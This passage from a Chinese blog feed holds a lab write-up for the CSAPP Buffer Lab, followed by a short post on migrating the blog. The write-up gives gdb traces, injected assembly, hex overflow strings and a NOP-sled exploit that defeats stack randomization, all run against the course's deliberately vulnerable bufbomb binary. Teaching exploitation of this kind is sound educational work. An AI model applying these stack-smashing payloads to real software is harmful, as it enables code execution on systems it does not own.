/home/user/CSAPPLabs/BufferLab/buflab-handout/bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line"></div><div class="line">Breakpoint 1, 0x080491fa <span class="keyword">in</span> getbuf ()</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getbuf:</div><div class="line">   0x080491f4 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x080491f5 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x080491f7 &lt;+3&gt;:	sub    <span class="variable">$0x38</span>,%esp</div><div class="line">=&gt; 0x080491fa &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x080491fd &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08049200 &lt;+12&gt;:	call   0x8048cfa &lt;Gets&gt;</div><div class="line">   0x08049205 &lt;+17&gt;:	mov    <span class="variable">$0x1</span>,%eax</div><div class="line">   0x0804920a &lt;+22&gt;:	leave  </div><div class="line">   0x0804920b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></div><div class="line"><span class="variable">$1</span> = 0x55682f18</div><div class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></div><div class="line"><span class="variable">$2</span> = 0x55682f50</div></pre></td></tr></table></figure></p>
<p>通过在gdb中添加断点并观察，我们可以确定在执行函数getbuf时，栈底（%ebp）的值为0x55682f50。</p>
<p>接下来我们要通过gcc和objdump生成攻击代码，具体的操作和Attack Lab相似，我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax</div><div class="line"><span class="keyword">mov</span> %eax, <span class="number">0x804d100</span> <span class="comment">;设置全局变量</span></div><div class="line"><span class="keyword">add</span> <span class="number">$16</span>, %esp <span class="comment">;修改栈顶</span></div><div class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></div></pre></td></tr></table></figure></p>
<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o &gt; level2-exploit.d</code>将攻击代码汇编和反汇编，具体的命令和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gcc -m32 -c level2-exploit.s                          </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d level2-exploit.o &gt; level2-exploit.d</div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2-exploit.d                                    </div><div class="line"></div><div class="line">level2-exploit.o：     文件格式 elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	b8 4c 92 de 3d       	mov    <span class="variable">$0x3dde924c</span>,%eax</div><div class="line">   5:	a3 00 d1 04 08       	mov    %eax,0x804d100</div><div class="line">   a:	83 c4 10             	add    <span class="variable">$0x10</span>,%esp</div><div class="line">   d:	c3                   	ret     </div></pre></td></tr></table></figure>　</p>
<p>最后我们根据以上的信息来生成我们最终的攻击代码，如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp以及返回地址(在栈上) */</div><div class="line">b8 4c 92 de 3d a3 00 d1</div><div class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</div><div class="line">9d 8c 04 08　           /* 返回地址指向函数bang */</div></pre></td></tr></table></figure></p>
<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level2.txt|./hex2raw|./bufbomb -u BlackDragon</div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Bang!: You <span class="built_in">set</span> global_value to 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段2完成。</p>
<h3 id="阶段3：炸药（Dynamite）"><a href="#阶段3：炸药（Dynamite）" class="headerlink" title="阶段3：炸药（Dynamite）"></a>阶段3：炸药（Dynamite）</h3><p>在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。</p>
<p>在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着你必须：</p>
<ol>
<li>在栈上执行机器代码</li>
<li>将返回指针置于代码的起始</li>
<li>修复对栈造成的破坏</li>
</ol>
<p>具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p>
<p>对于该阶段，我们的思路如下：</p>
<ol>
<li>缓冲区溢出的部分要保证保存的%ebp不变以方便后续的寻址过程（攻击代码中使用）。然后和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码</li>
<li>攻击代码首先将返回地址设置为正确的返回地址（调用者的下一条指令）</li>
<li>然后再将返回值（%eax）设置为cookie</li>
<li>最终修改栈顶（%esp）并ret</li>
</ol>
<p>缓冲区溢出攻击后，我们期望的整个程序的执行过程如下：</p>
<ol>
<li>跳转至栈上执行代码，此时%esp被修改至第48个字节处，且%ebp中存有正确的值。</li>
<li>程序执行攻击代码，该攻击代码重置了返回地址，覆盖了getbuf的返回值，修改了栈顶指针并ret</li>
<li>程序带着完整的栈状态和修改后的返回值返回至test函数，并继续执行</li>
</ol>
<p>下面我们讨论一下攻击代码中具体的细节。</p>
<p>首先是保存的ebp的值到底是多少，这个我们可以在gdb中直接调试打印得出，为0x55682f80。<br>栈上的返回地址和阶段2一样，为0x55682f58。</p>
<p>然后我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x8048dbe, %eax <span class="comment">;将真正的返回地址送入%eax</span></div><div class="line"><span class="keyword">mov</span> %eax, -<span class="number">0x2c</span>(%ebp) <span class="comment">;将%eax送入栈上的正确位置</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;修改返回值</span></div><div class="line"><span class="keyword">sub</span> <span class="number">$4</span>, %esp <span class="comment">;修改栈顶%esp</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<p>这里讨论一下为什么是-0x2c(%ebp)，保存的%ebp是调用者的栈底，我们观察调用者函数test的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">08048<span class="keyword">daa</span> &lt;<span class="keyword">test</span>&gt;:</div><div class="line"> 8048<span class="keyword">daa</span>:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</div><div class="line"> 8048dab:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</div><div class="line"> 8048dad:       <span class="number">53</span>                      <span class="keyword">push</span>   %ebx</div><div class="line"> 8048dae:       <span class="number">83</span> ec <span class="number">24</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x24,%esp</div><div class="line"> 8048db1:       e8 da ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</div><div class="line"> 8048db6:       <span class="number">89</span> <span class="number">45</span> f4                <span class="keyword">mov</span>    %eax,-<span class="number">0xc</span>(%ebp)</div><div class="line"> 8048db9:       e8 <span class="number">36</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   80491f4 &lt;getbuf&gt;</div><div class="line"> 8048dbe:       <span class="number">89</span> c3                   <span class="keyword">mov</span>    %eax,%ebx</div><div class="line"> 8048dc0:       e8 cb ff ff ff          <span class="keyword">call</span>   8048d90 &lt;uniqueval&gt;</div><div class="line"> 8048dc5:       8b <span class="number">55</span> f4                <span class="keyword">mov</span>    -<span class="number">0xc</span>(%ebp),%edx</div><div class="line"> 8048dc8:       <span class="number">39</span> d0                   <span class="keyword">cmp</span>    %edx,%eax</div><div class="line"> 8048dca:       <span class="number">74</span> 0e                   <span class="keyword">je</span>     8048dda &lt;<span class="keyword">test</span>+<span class="number">0x30</span>&gt;</div><div class="line"> 8048dcc:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">88</span> a3 <span class="number">04</span> <span class="number">08</span>    movl   <span class="number">$0</span>x804a388,(%esp)</div><div class="line"> 8048dd3:       e8 e8 fa ff ff          <span class="keyword">call</span>   80488c0 &lt;puts@plt&gt;</div><div class="line"> 8048dd8:       eb <span class="number">46</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</div><div class="line"> 8048dda:       3b <span class="number">1d</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%ebx</div><div class="line"> 8048de0:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048e08 &lt;<span class="keyword">test</span>+<span class="number">0x5e</span>&gt;</div><div class="line"> 8048de2:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048de6:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> 2a a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a52a,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048ded:       <span class="number">08</span></div><div class="line"> 8048dee:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048df5:       e8 c6 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048dfa:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x3,(%esp)</div><div class="line"> 8048e01:       e8 <span class="number">75</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</div><div class="line"> 8048e06:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048e20 &lt;<span class="keyword">test</span>+<span class="number">0x76</span>&gt;</div><div class="line"> 8048e08:       <span class="number">89</span> 5c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %ebx,<span class="number">0x8</span>(%esp)</div><div class="line"> 8048e0c:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">47</span> a5 <span class="number">04</span>    movl   <span class="number">$0</span>x804a547,<span class="number">0x4</span>(%esp)</div><div class="line"> 8048e13:       <span class="number">08</span></div><div class="line"> 8048e14:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</div><div class="line"> 8048e1b:       e8 a0 fb ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</div><div class="line"> 8048e20:       <span class="number">83</span> c4 <span class="number">24</span>                <span class="keyword">add</span>    <span class="number">$0</span>x24,%esp</div><div class="line"> 8048e23:       5b                      <span class="keyword">pop</span>    %ebx</div><div class="line"> 8048e24:       <span class="number">5d</span>                      <span class="keyword">pop</span>    %ebp</div><div class="line"> 8048e25:       c3                      <span class="keyword">ret</span>    </div></pre></td></tr></table></figure></p>
<p>我们可以知道函数test在栈上分配了0x24=36个字节的空间，而在这之前栈上还有被push的%ebx占4个字节，那么如果要想要定位到调用者栈顶的返回地址，偏移量应为36+4+4=44=0x2c，考虑到栈自高地址向低地址增长，所以应为-0x2c(%ebp)。</p>
<p>而程序从getbuf返回时栈顶指针并没有指向我们设置的返回地址，而是指向了栈上紧邻着该地址的高地址位置，所以我们需要将%esp-4以确保其指向了我们设置的返回地址，使得程序能正确返回。</p>
<p>下面我们使用gcc和objdump生成攻击代码，并且我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">80 2f 68 55 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上） */</div><div class="line">b8 be 8d 04 08 89 45 d4 /* 攻击代码 */</div><div class="line">b8 4c 92 de 3d 83 ec 04</div><div class="line">c3</div></pre></td></tr></table></figure></p>
<p>最后我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3.txt|./hex2raw|./bufbomb -u BlackDragon         </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Boom!: getbuf returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段3完成。</p>
<h4 id="攻击代码的优化"><a href="#攻击代码的优化" class="headerlink" title="攻击代码的优化"></a>攻击代码的优化</h4><p>注意到在上面我们的攻击代码还是很麻烦的，我们不仅花了很大的时间保证被保存的%ebp不变，还调整了栈顶指针使得函数能正确返回。</p>
<p>其实，我们可以使用push returnAddress，ret来达到返回到指定位置的效果。也能直接在攻击代码中设置%ebp的值，这样，我们的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c,%eax <span class="comment">;返回值</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x55682f80,%ebp <span class="comment">;修改%ebp</span></div><div class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048dbe <span class="comment">;将返回地址压栈</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<p>根据以上的信息重新生成我们的攻击代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 2f 68 55 /* 保存的%ebp和返回地址（位于栈上）*/</div><div class="line">b8 4c 92 de 3d bd 80 2f /* 攻击代码 */</div><div class="line">68 55 68 be 8d 04 08 c3</div></pre></td></tr></table></figure></p>
<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level3-2.txt|./hex2raw|./bufbomb -u BlackDragon          </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:Boom!: getbuf returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h3 id="阶段4：硝化甘油（Nitroglycerin）"><a href="#阶段4：硝化甘油（Nitroglycerin）" class="headerlink" title="阶段4：硝化甘油（Nitroglycerin）"></a>阶段4：硝化甘油（Nitroglycerin）</h3><blockquote>
<p>需要为bufbomb以及hex2raw添加命令行参数’-n’以执行本阶段</p>
</blockquote>
<p>本阶段非常的具有挑战性，在本阶段中，函数getbuf的栈帧的位置在每次运行时都是不同的。栈随机化的策略明显提升了攻击的难度。</p>
<p>具体来说，在该阶段中，程序会调用getbufn来从标准输入流中读取数据，和getbuf不同的是，getbufn具有512个字节的缓冲区，并且，在相邻两次getbufn的调用中，%ebp的值将会出现最多+-240的误差。除此以外，在该阶段中，程序总共会使用5次你所输入的字符串，也就是说，总共会调用5次getbufn。同阶段3的任务相似，你必须保证每一次调用getbufn，其返回值均为cookie。</p>
<p>若返回值为cookie，则程序会输出”KABOOM!”。你的攻击代码需要在5次栈帧位置不同的函数getbuf的调用中设置cookie为返回值，恢复对栈造成的破坏，设置正确的返回地址，并最终执行ret执行以返回testn。</p>
<p>在本阶段中我们需要使用一种名为nop雪橇（nop sled）的攻击方式来对抗随机化。具体来说，就是通过在攻击代码前大量插入nop（空操作，编码为90）。这样，就算栈的起始地址在一定范围内波动，只要程序能跳转至其中一个nop指令，就能顺着这一组nop指令滑向我们真正的攻击代码。</p>
<p>首先我们需要考虑的是我们攻击代码的长度，由于必须要通过缓冲区溢出覆盖掉函数getbufn的返回地址，所以攻击代码的长度至少为520个字节的缓冲区，4个字节的被保存的%ebp，以及4个字节的返回地址。</p>
<p>我们将攻击代码放在缓冲区的最后，并且用90（nop）填充所有未被利用到的缓冲区以实现一个nop sled。</p>
<p>具体的攻击代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">lea</span> <span class="number">0x28</span>(%esp), %ebp <span class="comment">;复原%ebp</span></div><div class="line"><span class="keyword">mov</span> <span class="number">$0</span>x3dde924c, %eax <span class="comment">;设置cookie</span></div><div class="line"><span class="keyword">push</span> <span class="number">$0</span>x8048e3a <span class="comment">;将返回地址压栈</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
<p>注意到我们无法再采用阶段3中的办法来复原%ebp了。但是注意到，当函数从getbufn返回时，%esp的值是正确的，而%esp和%ebp的相对差值是固定的，因此我们可以根据函数返回时的%esp去还原%ebp，对于testn来说，%esp和%ebp之间相差了36+4=40=0x28个字节。</p>
<p>最后是返回地址的设定，在gdb中观察可知第一次执行时buf的地址为0x55682f40，因此我们将返回地址设置为0x55682f40-480=0x55682d60可保证每次都能命中。</p>
<p>最终我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 /* nop sled */</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 8d 6c 24</div><div class="line">28 b8 4c 92 de 3d 68 3a 8e 04 08 c3 60 2d 68 55 /* 攻击代码与返回地址 */</div></pre></td></tr></table></figure></p>
<p>使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level4.txt|./hex2raw -n|./bufbomb -u BlackDragon -n  </div><div class="line">Userid: BlackDragon</div><div class="line">Cookie: 0x3dde924c</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x3dde924c</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<p>阶段4完成。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>Buffer Lab整体上同Attack Lab的第1部分，代码注入攻击相似，不同在于需要了解IA32的栈帧结构，过程调用以及参数传递的原理。</p>
<p>除此以外，还需要了解对抗栈随机化的一种攻击方式 - nop sled。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验答案托管在我的&lt;a href=&quot;https://github.com/BlackDragonF/CSAPPLabs/tree/master/BufferLab&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Github&lt;/a&gt;上&lt;/p&gt;
&lt;blockq
    
    </summary>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>迁移说明</title>
    <link href="http://blog.codedragon.tech/2017/05/12/%E8%BF%81%E7%A7%BB%E8%AF%B4%E6%98%8E/"/>
    <id>http://blog.codedragon.tech/2017/05/12/迁移说明/</id>
    <published>2017-05-12T09:36:25.000Z</published>
    <updated>2017-05-14T16:30:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="博客历史"><a href="#博客历史" class="headerlink" title="博客历史"></a>博客历史</h2><ul>
<li>本博客自2016年1月4日上线。最早部署于BlackDragon的阿里云上，使用的是WordPress框架，服务器则采用了LAMP环境，DNS解析至一级域名。</li>
<li>博客自上线后曾频繁的出现无法连接至数据库的情况，经过检查可能的原因是Apache占用的内存过大以至于MySQL服务被杀。后采用LNMP环境。</li>
<li>2016年12月12日，将博客整个导出至Hexo并且部署至Github Pages，DNS解析至二级域名blog，原服务器与域名停止解析。</li>
</ul>
<h2 id="博客迁移"><a href="#博客迁移" class="headerlink" title="博客迁移"></a>博客迁移</h2><blockquote>
<p>博客迁移的原因<br>在目前，我仍然希望这个博客的内容能被更多的人关注到，也希望能和更多的人交流，所以向Google和Baidu分别提交了Sitemap。<br>但是因国内Baidu仍然作为主要的搜索引擎，加上Github屏蔽了Baidu的爬虫，无法让博客的Sitemap被Baidu抓取并索引，在进行了尝试后决定将博客迁移。</p>
</blockquote>
<p>在遇到上述问题时，我首先尝试了将hexo生成的博客部署到Github以及Coding两个代码仓库，并通过DNS解析将国内和国外的访问分别解析至Coding和Github，并解决了问题。</p>
<p>但是个人觉得这样做不够优雅，经过考虑还是决定将博客重新迁移至自己的阿里云，使用CentOS7作为Server，Nginx作为Web Server，同时将Github的Repo作为Mirror。</p>
<p>博客于2017年5月11日完成迁移，又于2017年5月12日完成相应的优化调整。</p>
<p>现在你可以访问</p>
<ul>
<li><a href="http://blog.duskdragon.com" target="_blank" rel="external">blog.duskdragon.com</a> 主站点</li>
<li><a href="https://blackdragonf.github.io/" target="_blank" rel="external">blackdragonf.github.io</a> 备份站点</li>
</ul>
<blockquote>
<p>这个博客的意义<br>这个博客不是技术博客（目前），因为我现在并没有足够的技能去支持一个技术博客。我现在仅仅是作为一个学习者记录在学习过程中遇到的各种问题，并且将学到的知识加以总结。欢迎任何的技术交流以及错误指正。<br>如果我所记录的题目的解答或是实验的报告能够给同样还在学习的你带来帮助，这就是对我最大的鼓励。</p>
</blockquote>
<h3 id="迁移过程中遇到的问题"><a href="#迁移过程中遇到的问题" class="headerlink" title="迁移过程中遇到的问题"></a>迁移过程中遇到的问题</h3><ul>
<li>在配置iptables时，我在没有开放22端口的情况下将INPUT的默认策略设置为DROP，直接导致了ssh断开连接，不得不重置了阿里云。</li>
<li>/home下的用户文件夹默认不具有读和执行权限，而我的html根目录放在家目录下，这导致了我在部署nginx时出现了403 Forbidden的错误。</li>
</ul>
<h2 id="优化调整"><a href="#优化调整" class="headerlink" title="优化调整"></a>优化调整</h2><p>本次迁移博客同时对于博客做出了以下优化及调整：</p>
<ul>
<li>将背景图片从PNG格式改为JPG格式，减少网页加载的时间</li>
<li>之前为了美观采用了WQY字体，但是将字体作为资源文件大大延长了加载的时间，现在博客的中文字体采用了Google Fonts中的Noto Sans SC</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;博客历史&quot;&gt;&lt;a href=&quot;#博客历史&quot; class=&quot;headerlink&quot; title=&quot;博客历史&quot;&gt;&lt;/a&gt;博客历史&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;本博客自2016年1月4日上线。最早部署于BlackDragon的阿里云上，使用的是WordPress框架，服务
    
    </summary>
    
